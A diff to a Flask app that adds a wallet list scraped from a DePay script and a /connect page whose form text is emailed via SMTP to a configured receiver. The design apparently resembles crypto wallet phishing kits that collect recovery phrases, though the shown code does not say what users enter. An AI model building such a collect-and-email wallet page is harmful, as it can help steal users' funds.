@@ -12,8 +12,32 @@ SENDER_PASSWORD = os.getenv("SENDER_PASSWORD")  # Brevo SMTP key
 RECEIVER_EMAIL = os.getenv("RECEIVER_EMAIL")
 SMTP_USERNAME = os.getenv("SMTP_USERNAME")
 
-@app.route("/", methods=["GET", "POST"])
+
+def get_wallets():
+    try:
+        # Try to fetch from DePay (fallback to local list if failed)
+        url = "https://unpkg.com/@depay/web3-wallets@18.0.4/dist/umd/index.js"
+        js_code = requests.get(url).text
+        match = re.search(r'wallets:\s*({.*?}),\n', js_code, re.DOTALL)
+        if match:
+            wallets_js = match.group(1).replace("'", '"')
+            wallets_js = re.sub(r'(\w+):', r'"\1":', wallets_js)
+            return json.loads(f"{{{wallets_js}}}")
+    except:
+        pass
+
+    # Fallback to local data
+    return [
+        {"name": "MetaMask", "image": "https://cdn.depay.com/web3-wallets/metamask.png", "url": "https://metamask.io"},
+        {"name": "Trust Wallet", "image": "https://cdn.depay.com/web3-wallets/trust.png",
+         "url": "https://trustwallet.com"}
+    ]
+@app.route("/")
 def index():
+    return render_template("index.html")
+
+@app.route("/connect", methods=["GET", "POST"])
+def connect():
     if request.method == "POST":
         message = request.form["message"]
 
@@ -41,7 +65,7 @@ def index():
         except Exception as e:
             return f"❌ Error sending email: {e}"
 
-    return render_template("index.html")
+    return render_template("connect.html")
 
 if __name__ == "__main__":
     # Use the environment variable for the port (Render sets it automatically)
